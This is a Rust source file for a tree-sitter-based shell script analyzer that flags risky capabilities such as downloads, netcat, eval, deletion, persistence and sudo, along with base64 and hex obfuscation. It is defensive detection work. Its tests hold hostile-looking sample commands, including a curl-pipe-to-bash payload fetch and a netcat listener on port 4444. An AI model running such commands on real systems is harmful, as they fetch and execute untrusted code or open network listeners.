//! Shell script analyzer (bash, sh, zsh).

use crate::analyzers::Analyzer;
use crate::analyzers::{
    comment_metrics::{self, CommentStyle},
    function_metrics::{self, FunctionInfo},
    identifier_metrics, string_metrics, symbol_extraction, text_metrics,
};
use crate::capabilities::CapabilityMapper;
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::Parser;

/// Shell script analyzer using tree-sitter
pub struct ShellAnalyzer {
    parser: RefCell<Parser>,
    capability_mapper: CapabilityMapper,
}

impl ShellAnalyzer {
    /// Creates a new shell script analyzer with tree-sitter bash parser
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_bash::LANGUAGE.into())
            .unwrap();

        Self {
            parser: RefCell::new(parser),
            capability_mapper: CapabilityMapper::empty(),
        }
    }

    /// Create analyzer with pre-existing capability mapper (avoids duplicate loading)
    pub fn with_capability_mapper(mut self, capability_mapper: CapabilityMapper) -> Self {
        self.capability_mapper = capability_mapper;
        self
    }

    fn analyze_script(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Parse the shell script
        let tree = self
            .parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse shell script")?;

        let root = tree.root_node();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "shell_script".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report.structure.push(StructuralFeature {
            id: "source/language/shell".to_string(),
            desc: "Shell script".to_string(),
            evidence: vec![Evidence {
                method: "shebang".to_string(),
                source: "tree-sitter-bash".to_string(),
                value: content.lines().next().unwrap_or("").to_string(),
                location: Some("line:1".to_string()),
            }],
        });

        // Detect capabilities by traversing AST
        self.detect_capabilities(&root, content.as_bytes(), &mut report);

        // Extract functions
        self.extract_functions(&root, content.as_bytes(), &mut report);

        // Extract command calls as symbols for symbol-based rule matching
        symbol_extraction::extract_symbols(
            content,
            tree_sitter_bash::LANGUAGE.into(),
            &["command", "command_name"],
            &mut report,
        );

        // Detect shell idioms
        let shell_idioms = self.detect_shell_idioms(&root, content.as_bytes());

        // Add idioms to source code metrics if they exist
        if let Some(ref mut metrics) = report.source_code_metrics {
            metrics.shell_idioms = Some(shell_idioms);
        }

        // === Compute metrics for ML analysis (BEFORE trait evaluation) ===
        let metrics = self.compute_metrics(&root, content);
        report.metrics = Some(metrics);

        // Evaluate trait definitions and composite rules from YAML
        let trait_findings = self
            .capability_mapper
            .evaluate_traits(&report, content.as_bytes());
        let composite_findings = self
            .capability_mapper
            .evaluate_composite_rules(&report, content.as_bytes());

        // Add all findings from trait evaluation
        for f in trait_findings
            .into_iter()
            .chain(composite_findings.into_iter())
        {
            if !report.findings.iter().any(|existing| existing.id == f.id) {
                report.findings.push(f);
            }
        }

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-bash".to_string()];

        Ok(report)
    }

    /// Compute all metrics for shell scripts
    fn compute_metrics(&self, root: &tree_sitter::Node, content: &str) -> Metrics {
        let source = content.as_bytes();
        let total_lines = content.lines().count() as u32;

        // Universal text metrics
        let text = text_metrics::analyze_text(content);

        // Extract identifiers (variable names in shell)
        let identifiers = self.extract_identifiers(root, source);
        let ident_refs: Vec<&str> = identifiers.iter().map(|s| s.as_str()).collect();
        let identifier_metrics = identifier_metrics::analyze_identifiers(&ident_refs);

        // Extract strings
        let strings = self.extract_string_literals(root, source);
        let str_refs: Vec<&str> = strings.iter().map(|s| s.as_str()).collect();
        let string_metrics = string_metrics::analyze_strings(&str_refs);

        // Comment metrics (hash comments for shell)
        let comment_metrics = comment_metrics::analyze_comments(content, CommentStyle::Hash);

        // Function metrics
        let func_infos = self.extract_function_info(root, source);
        let func_metrics = function_metrics::analyze_functions(&func_infos, total_lines);

        // Shell-specific metrics
        let shell_metrics = self.compute_shell_metrics(root, source, content);

        Metrics {
            text: Some(text),
            identifiers: Some(identifier_metrics),
            strings: Some(string_metrics),
            comments: Some(comment_metrics),
            functions: Some(func_metrics),
            shell: Some(shell_metrics),
            ..Default::default()
        }
    }

    /// Extract identifiers (variable names) from shell script
    fn extract_identifiers(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut identifiers = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_identifiers(&mut cursor, source, &mut identifiers);
        identifiers
    }

    fn walk_for_identifiers(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        identifiers: &mut Vec<String>,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();

            // Variable names in shell
            if node.kind() == "variable_name" || node.kind() == "simple_expansion" {
                if let Ok(text) = node.utf8_text(source) {
                    let name = text.trim_start_matches('$');
                    if !name.is_empty() {
                        identifiers.push(name.to_string());
                    }
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    /// Extract string literals from shell script
    fn extract_string_literals(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut strings = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_strings(&mut cursor, source, &mut strings);
        strings
    }

    fn walk_for_strings(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        strings: &mut Vec<String>,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();

            if node.kind() == "string" || node.kind() == "raw_string" {
                if let Ok(text) = node.utf8_text(source) {
                    // Strip quotes
                    let s = text
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches('\'')
                        .trim_end_matches('\'');
                    if !s.is_empty() {
                        strings.push(s.to_string());
                    }
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    /// Extract function information for metrics
    fn extract_function_info(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<FunctionInfo> {
        let mut functions = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_function_info(&mut cursor, source, &mut functions, 0);
        functions
    }

    fn walk_for_function_info(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        functions: &mut Vec<FunctionInfo>,
        _depth: u32,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        let mut depth = _depth;
        loop {
            let node = cursor.node();

            if node.kind() == "function_definition" {
                let mut info = FunctionInfo::default();

                // Get function name
                if let Some(name_node) = node.child_by_field_name("name") {
                    if let Ok(name) = name_node.utf8_text(source) {
                        info.name = name.to_string();
                    }
                }

                // Shell functions don't have explicit parameters
                // They use $1, $2, etc. which we could count in the body
                info.param_count = 0;

                // Line count
                info.start_line = node.start_position().row as u32;
                info.end_line = node.end_position().row as u32;
                info.line_count = info.end_line.saturating_sub(info.start_line) + 1;
                info.nesting_depth = depth;

                functions.push(info);
            }

            if cursor.goto_first_child() {
                if node.kind() == "function_definition" {
                    depth += 1;
                }
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                let parent = cursor.node();
                if parent.kind() == "function_definition" {
                    depth = depth.saturating_sub(1);
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    /// Compute shell-specific metrics
    fn compute_shell_metrics(
        &self,
        root: &tree_sitter::Node,
        source: &[u8],
        content: &str,
    ) -> ShellMetrics {
        let mut metrics = ShellMetrics::default();
        let mut cursor = root.walk();
        self.walk_for_shell_metrics(&mut cursor, source, &mut metrics);

        // Pattern-based detection
        metrics.eval_count += content.matches("eval ").count() as u32;
        metrics.base64_decode_count += content.matches("base64 -d").count() as u32;
        metrics.base64_decode_count += content.matches("base64 --decode").count() as u32;

        metrics
    }

    fn walk_for_shell_metrics(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        metrics: &mut ShellMetrics,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();

            if node.kind() == "command" {
                if let Ok(text) = node.utf8_text(source) {
                    // Command execution patterns
                    if text.starts_with("eval ") {
                        metrics.eval_count += 1;
                    }
                    if text.starts_with("source ") || text.starts_with(". ") {
                        metrics.source_count += 1;
                    }
                    if text.contains("curl ") || text.contains("wget ") {
                        metrics.curl_wget_count += 1;
                    }
                    if text.contains("chmod +x") || text.contains("chmod 7") {
                        metrics.chmod_x_count += 1;
                    }
                    if text.contains("rm -rf") || text.contains("shred ") {
                        metrics.secure_delete_count += 1;
                    }
                }
            } else if node.kind() == "process_substitution" {
                metrics.process_substitution += 1;
            } else if node.kind() == "pipeline" {
                metrics.pipe_count += 1;
            } else if node.kind() == "heredoc_body" || node.kind() == "heredoc_redirect" {
                metrics.here_doc_count += 1;
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn detect_capabilities(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();

        // Walk the AST looking for command invocations
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();

            match node.kind() {
                "command" => {
                    if let Some(name_node) = node.child_by_field_name("name") {
                        if let Ok(cmd_name) = name_node.utf8_text(source) {
                            self.analyze_command(cmd_name, &node, source, report);
                        }
                    }
                }
                "function_definition" => {
                    // Already handled by extract_functions
                }
                "variable_assignment" => {
                    self.check_obfuscation(&node, source, report);
                }
                _ => {}
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn analyze_command(
        &self,
        cmd: &str,
        node: &tree_sitter::Node,
        _source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let capability = match cmd {
            "curl" | "wget" => Some((
                "net/http/client",
                "Download files via HTTP",
                Criticality::Notable,
            )),
            "nc" | "netcat" => Some((
                "net/socket/connect",
                "Network socket connections",
                Criticality::Notable,
            )),
            "exec" | "eval" => Some((
                "exec/script/eval",
                "Execute dynamic code",
                Criticality::Notable,
            )),
            "sh" | "bash" | "zsh" => Some((
                "exec/command/shell",
                "Execute shell commands",
                Criticality::Notable,
            )),
            "rm" | "unlink" => Some(("fs/delete", "Delete files", Criticality::Notable)),
            "chmod" | "chown" => Some((
                "fs/permissions",
                "Modify file permissions",
                Criticality::Notable,
            )),
            "crontab" => Some((
                "persistence/cron",
                "Schedule tasks with cron",
                Criticality::Notable,
            )),
            "systemctl" | "service" => Some((
                "persistence/service",
                "Manage system services",
                Criticality::Notable,
            )),
            "sudo" => Some((
                "privilege/escalation",
                "Execute with elevated privileges",
                Criticality::Notable,
            )),
            _ => None,
        };

        if let Some((cap_id, description, criticality)) = capability {
            // Check if we already have this capability
            if !report.findings.iter().any(|c| c.id == cap_id) {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: cap_id.to_string(),
                    desc: description.to_string(),
                    conf: 1.0,
                    crit: criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-bash".to_string(),
                        value: cmd.to_string(),
                        location: Some(format!("line:{}", node.start_position().row + 1)),
                    }],
                });
            }
        }
    }

    fn check_obfuscation(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        if let Ok(text) = node.utf8_text(source) {
            // Check for base64 encoding patterns
            if (text.contains("base64") || text.contains("b64decode"))
                && !report
                    .findings
                    .iter()
                    .any(|c| c.id == "anti-analysis/obfuscation/base64")
            {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "anti-analysis/obfuscation/base64".to_string(),
                    desc: "Uses base64 encoding/decoding".to_string(),
                    conf: 0.9,
                    crit: Criticality::Suspicious,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "pattern".to_string(),
                        source: "tree-sitter-bash".to_string(),
                        value: "base64".to_string(),
                        location: Some(format!("line:{}", node.start_position().row + 1)),
                    }],
                });
            }

            // Check for hex encoding
            if text.contains("\\x")
                && text.matches("\\x").count() > 3
                && !report
                    .findings
                    .iter()
                    .any(|c| c.id == "anti-analysis/obfuscation/hex")
            {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "anti-analysis/obfuscation/hex".to_string(),
                    desc: "Uses hex-encoded strings".to_string(),
                    conf: 0.9,
                    crit: Criticality::Suspicious,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "pattern".to_string(),
                        source: "tree-sitter-bash".to_string(),
                        value: "hex_encoding".to_string(),
                        location: Some(format!("line:{}", node.start_position().row + 1)),
                    }],
                });
            }

            // Check for eval with variable (dynamic code execution)
            if (text.contains("eval") || text.contains("exec"))
                && text.contains("$")
                && !report
                    .findings
                    .iter()
                    .any(|c| c.id == "anti-analysis/obfuscation/dynamic-eval")
            {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "anti-analysis/obfuscation/dynamic-eval".to_string(),
                    desc: "Executes dynamically constructed code".to_string(),
                    conf: 0.95,
                    crit: Criticality::Suspicious,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "pattern".to_string(),
                        source: "tree-sitter-bash".to_string(),
                        value: "eval_with_variable".to_string(),
                        location: Some(format!("line:{}", node.start_position().row + 1)),
                    }],
                });
            }
        }
    }

    /// Calculate cyclomatic complexity for a shell function
    fn calculate_cyclomatic_complexity(&self, node: &tree_sitter::Node, source: &[u8]) -> u32 {
        let mut complexity = 1; // Base complexity
        let mut cursor = node.walk();

        loop {
            let current = cursor.node();
            match current.kind() {
                "if_statement" => complexity += 1,
                "case_statement" | "case_item" => complexity += 1,
                "for_statement" | "c_style_for_statement" => complexity += 1,
                "while_statement" | "until_statement" => complexity += 1,
                "elif_clause" => complexity += 1,
                "test_command" => {
                    // Count && and || in test commands
                    if let Ok(text) = current.utf8_text(source) {
                        complexity += text.matches("&&").count() as u32;
                        complexity += text.matches("||").count() as u32;
                    }
                }
                _ => {}
            }

            // Traverse
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return complexity;
                }
            }
        }
    }

    /// Analyze function signature for shell functions
    fn analyze_function_signature(
        &self,
        _node: &tree_sitter::Node,
        _source: &[u8],
    ) -> FunctionSignature {
        // Shell functions don't have explicit parameter declarations
        // Parameters are accessed via $1, $2, etc.
        FunctionSignature {
            param_count: 0, // Not explicitly declared in shell
            default_param_count: 0,
            has_var_positional: false, // Shell uses $@
            has_var_keyword: false,
            has_type_hints: false,
            has_return_type: false,
            decorators: Vec::new(),
            is_async: false, // Shell has background jobs but not async in the modern sense
            is_generator: false,
            is_lambda: false,
        }
    }

    /// Calculate nesting depth of control structures
    fn calculate_nesting_depth(&self, node: &tree_sitter::Node) -> NestingMetrics {
        let mut max_depth = 0u32;
        let mut depths = Vec::new();
        let mut deep_nest_count = 0u32;
        let mut limit_hit = false;

        fn traverse(
            node: &tree_sitter::Node,
            current_depth: u32,
            max: &mut u32,
            depths: &mut Vec<u32>,
            deep: &mut u32,
            limit_hit: &mut bool,
        ) {
            // Prevent stack overflow on deeply nested/malformed ASTs
            if current_depth > crate::analyzers::ast_walker::MAX_RECURSION_DEPTH {
                *limit_hit = true;
                return;
            }
            let mut depth = current_depth;
            match node.kind() {
                "if_statement" | "case_statement" | "for_statement" | "while_statement"
                | "until_statement" | "subshell" => {
                    depth += 1;
                    depths.push(depth);
                    if depth > *max {
                        *max = depth;
                    }
                    if depth > 4 {
                        *deep += 1;
                    }
                }
                _ => {}
            }

            // Recurse through children
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                traverse(&child, depth, max, depths, deep, limit_hit);
            }
        }

        traverse(
            node,
            0,
            &mut max_depth,
            &mut depths,
            &mut deep_nest_count,
            &mut limit_hit,
        );

        NestingMetrics {
            max_depth,
            avg_depth: if !depths.is_empty() {
                depths.iter().sum::<u32>() as f32 / depths.len() as f32
            } else {
                0.0
            },
            deep_nest_count,
            depth_limit_hit: limit_hit,
        }
    }

    /// Analyze call patterns in shell functions
    fn analyze_call_patterns(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        func_name: &str,
    ) -> CallPatternMetrics {
        let mut call_count = 0u32;
        let mut callees: Vec<String> = Vec::new();
        let mut recursive_calls = 0u32;
        let mut dynamic_calls = 0u32;

        let mut cursor = node.walk();
        loop {
            let current = cursor.node();
            if current.kind() == "command" {
                call_count += 1;

                if let Some(name_node) = current.child_by_field_name("name") {
                    if let Ok(cmd_text) = name_node.utf8_text(source) {
                        let cmd_str = cmd_text.to_string();
                        callees.push(cmd_str.clone());

                        // Check recursion
                        if cmd_str == func_name {
                            recursive_calls += 1;
                        }

                        // Check dynamic calls (eval, source with variables)
                        if ["eval", "source", "."].iter().any(|&d| cmd_str.contains(d)) {
                            // Check if there's a variable expansion
                            if let Ok(full_text) = current.utf8_text(source) {
                                if full_text.contains('$') {
                                    dynamic_calls += 1;
                                }
                            }
                        }
                    }
                }
            }

            // Traverse
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    callees.sort();
                    callees.dedup();

                    return CallPatternMetrics {
                        call_count,
                        unique_callees: callees.len() as u32,
                        chained_calls: 0, // Shell uses pipes, not method chaining
                        max_chain_length: 0,
                        recursive_calls,
                        dynamic_calls,
                    };
                }
            }
        }
    }

    /// Detect shell-specific idioms
    fn detect_shell_idioms(&self, root: &tree_sitter::Node, source: &[u8]) -> ShellIdioms {
        let mut pipe_count = 0u32;
        let mut redirect_count = 0u32;
        let mut input_redirect_count = 0u32;
        let mut command_substitution_count = 0u32;
        let mut heredoc_count = 0u32;
        let mut case_statement_count = 0u32;
        let mut test_expression_count = 0u32;
        let mut while_read_count = 0u32;
        let mut subshell_count = 0u32;
        let mut for_loop_count = 0u32;
        let mut background_job_count = 0u32;
        let mut process_substitution_count = 0u32;

        let mut cursor = root.walk();
        loop {
            let node = cursor.node();
            match node.kind() {
                "pipeline" => {
                    // Count pipes in the pipeline
                    if let Ok(text) = node.utf8_text(source) {
                        pipe_count += text.matches('|').count() as u32;
                    }
                }
                "redirected_statement" | "file_redirect" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains('>') {
                            redirect_count += 1;
                        }
                        if text.contains('<') && !text.contains("<<") {
                            input_redirect_count += 1;
                        }
                    }
                }
                "command_substitution" => {
                    command_substitution_count += 1;
                }
                "heredoc_redirect" => {
                    heredoc_count += 1;
                }
                "case_statement" => {
                    case_statement_count += 1;
                }
                "test_command" | "bracket_command" => {
                    test_expression_count += 1;
                }
                "while_statement" => {
                    // Check if it's a while read loop
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains("read") {
                            while_read_count += 1;
                        }
                    }
                }
                "subshell" => {
                    subshell_count += 1;
                }
                "for_statement" | "c_style_for_statement" => {
                    for_loop_count += 1;
                }
                "command" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.ends_with('&') {
                            background_job_count += 1;
                        }
                    }
                }
                "process_substitution" => {
                    process_substitution_count += 1;
                }
                _ => {}
            }

            // Traverse
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return ShellIdioms {
                        pipe_count,
                        redirect_count,
                        input_redirect_count,
                        command_substitution_count,
                        heredoc_count,
                        case_statement_count,
                        test_expression_count,
                        while_read_count,
                        subshell_count,
                        for_loop_count,
                        background_job_count,
                        process_substitution_count,
                    };
                }
            }
        }
    }

    fn extract_functions(
        &self,
        root: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = root.walk();

        loop {
            let node = cursor.node();

            if node.kind() == "function_definition" {
                if let Some(name_node) = node.child_by_field_name("name") {
                    if let Ok(func_name) = name_node.utf8_text(source) {
                        let func_name_str = func_name.to_string();

                        // Calculate all metrics
                        let complexity = self.calculate_cyclomatic_complexity(&node, source);
                        let signature = self.analyze_function_signature(&node, source);
                        let nesting = self.calculate_nesting_depth(&node);
                        let call_patterns =
                            self.analyze_call_patterns(&node, source, &func_name_str);

                        // Extract command calls
                        let mut calls = Vec::new();
                        let mut call_cursor = node.walk();
                        loop {
                            let call_node = call_cursor.node();
                            if call_node.kind() == "command" {
                                if let Some(cmd_name_node) = call_node.child_by_field_name("name") {
                                    if let Ok(cmd_text) = cmd_name_node.utf8_text(source) {
                                        calls.push(cmd_text.to_string());
                                    }
                                }
                            }
                            if call_cursor.goto_first_child() {
                                continue;
                            }
                            loop {
                                if call_cursor.goto_next_sibling() {
                                    break;
                                }
                                if !call_cursor.goto_parent() {
                                    break;
                                }
                            }
                            if call_cursor.node() == node {
                                break;
                            }
                        }
                        calls.sort();
                        calls.dedup();

                        // Build control flow metrics
                        let control_flow = ControlFlowMetrics {
                            basic_blocks: complexity,
                            edges: if complexity > 1 { complexity + 1 } else { 1 },
                            cyclomatic_complexity: complexity,
                            max_block_size: 0,
                            avg_block_size: 0.0,
                            is_linear: complexity == 1,
                            loop_count: 0,
                            branch_density: 0.0,
                            in_degree: 0,
                            out_degree: call_patterns.unique_callees,
                        };

                        // Build properties
                        let properties = FunctionProperties {
                            is_pure: false,
                            is_noreturn: false,
                            is_recursive: call_patterns.recursive_calls > 0,
                            stack_frame: 0,
                            local_vars: 0,
                            args: signature.param_count,
                            is_leaf: call_patterns.call_count == 0,
                        };

                        report.functions.push(Function {
                            name: func_name_str,
                            offset: Some(format!("line:{}", node.start_position().row + 1)),
                            size: Some((node.end_byte() - node.start_byte()) as u64),
                            complexity: Some(complexity),
                            calls,
                            source: "tree-sitter-bash".to_string(),
                            control_flow: Some(control_flow),
                            instruction_analysis: None,
                            register_usage: None,
                            constants: Vec::new(),
                            properties: Some(properties),
                            call_patterns: Some(call_patterns),
                            nesting: Some(nesting),
                            signature: Some(signature),
                        });
                    }
                }
            }

            // Recurse
            if cursor.goto_first_child() {
                continue;
            }

            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return;
                }
            }
        }
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Default for ShellAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl Analyzer for ShellAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let bytes = fs::read(file_path).context("Failed to read shell script")?;
        let content = String::from_utf8_lossy(&bytes);

        self.analyze_script(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        if let Ok(data) = fs::read(file_path) {
            data.starts_with(b"#!/bin/sh")
                || data.starts_with(b"#!/bin/bash")
                || data.starts_with(b"#!/usr/bin/env bash")
        } else {
            false
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    fn analyze_shell_code(code: &str) -> AnalysisReport {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(code.as_bytes()).unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        analyzer.analyze(temp_file.path()).unwrap()
    }

    #[test]
    fn test_simple_script() {
        let script = r#"#!/bin/bash
curl https://example.com/payload.sh | bash
rm -rf /tmp/test
"#;

        let report = analyze_shell_code(script);

        // Should detect curl, bash, and rm capabilities
        assert!(report.findings.len() >= 2);
        assert!(report.findings.iter().any(|c| c.id.contains("http")));
        assert!(report.findings.iter().any(|c| c.id.contains("delete")));
    }

    #[test]
    fn test_detect_curl() {
        let script = "#!/bin/bash\ncurl https://example.com/data.txt";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
    }

    #[test]
    fn test_detect_wget() {
        let script = "#!/bin/bash\nwget https://example.com/file.tar.gz";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
    }

    #[test]
    fn test_detect_netcat() {
        let script = "#!/bin/bash\nnc -l 4444";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "net/socket/connect"));
    }

    #[test]
    fn test_detect_eval() {
        let script = "#!/bin/bash\neval \"echo hello\"";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "exec/script/eval"));
    }

    #[test]
    fn test_detect_exec() {
        let script = "#!/bin/bash\nexec /bin/sh";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "exec/script/eval"));
    }

    #[test]
    fn test_detect_rm() {
        let script = "#!/bin/bash\nrm -rf /tmp/data";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "fs/delete"));
    }

    #[test]
    fn test_detect_chmod() {
        let script = "#!/bin/bash\nchmod +x script.sh";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "fs/permissions"));
    }

    #[test]
    fn test_detect_chown() {
        let script = "#!/bin/bash\nchown root:root file.txt";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "fs/permissions"));
    }

    #[test]
    fn test_detect_crontab() {
        let script = "#!/bin/bash\ncrontab -e";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "persistence/cron"));
    }

    #[test]
    fn test_detect_systemctl() {
        let script = "#!/bin/bash\nsystemctl start nginx";
        let report = analyze_shell_code(script);

        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "persistence/service"));
    }

    #[test]
    fn test_detect_service() {
        let script = "#!/bin/bash\nservice apache2 restart";
        let report = analyze_shell_code(script);

        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "persistence/service"));
    }

    #[test]
    fn test_detect_sudo() {
        let script = "#!/bin/bash\nsudo apt-get update";
        let report = analyze_shell_code(script);

        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "privilege/escalation"));
    }

    #[test]
    fn test_detect_bash_execution() {
        let script = "#!/bin/bash\nbash -c 'echo hello'";
        let report = analyze_shell_code(script);

        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_structural_feature() {
        let script = "#!/bin/bash\necho hello";
        let report = analyze_shell_code(script);

        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/shell"));
    }

    #[test]
    fn test_multiple_capabilities() {
        let script = r#"#!/bin/bash
curl https://example.com/payload
chmod +x payload
sudo ./payload
rm payload
"#;
        let report = analyze_shell_code(script);

        assert!(report.findings.len() >= 4);
        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
        assert!(report.findings.iter().any(|c| c.id == "fs/permissions"));
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "privilege/escalation"));
        assert!(report.findings.iter().any(|c| c.id == "fs/delete"));
    }

    #[test]
    fn test_can_analyze_with_sh_shebang() {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(b"#!/bin/sh\necho hello").unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        assert!(analyzer.can_analyze(temp_file.path()));
    }

    #[test]
    fn test_can_analyze_with_bash_shebang() {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(b"#!/bin/bash\necho hello").unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        assert!(analyzer.can_analyze(temp_file.path()));
    }

    #[test]
    fn test_can_analyze_with_env_bash_shebang() {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file
            .write_all(b"#!/usr/bin/env bash\necho hello")
            .unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        assert!(analyzer.can_analyze(temp_file.path()));
    }

    #[test]
    fn test_cannot_analyze_without_shebang() {
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(b"echo hello").unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        assert!(!analyzer.can_analyze(temp_file.path()));
    }
}
